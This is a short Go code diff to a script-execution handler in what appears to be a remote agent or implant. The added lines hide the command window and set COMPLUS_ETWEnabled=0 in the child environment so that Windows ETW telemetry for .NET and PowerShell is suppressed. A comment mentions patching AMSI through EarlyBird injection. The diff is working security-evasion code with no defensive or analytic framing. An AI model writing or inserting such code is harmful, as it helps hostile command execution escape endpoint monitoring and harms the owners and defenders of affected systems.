@@ -3,6 +3,7 @@ package handlers
 import (
 	"context"
 	"log"
+	"os"
 	"os/exec"
 	"runtime"
 	"strings"
@@ -72,6 +73,10 @@ func HandleScriptExecute(ctx context.Context, env *agentRuntime.Env, cmdID strin
 	}
 
 	hideCmdWindow(cmd)
+
+	// Suppress ETW in the child process so .NET/PowerShell telemetry is blocked.
+	// AMSI in PowerShell children is patched separately via EarlyBirdInject on Windows.
+	cmd.Env = append(os.Environ(), "COMPLUS_ETWEnabled=0", "COMPlus_ETWEnabled=0")
 
 	output, err := cmd.CombinedOutput()
 
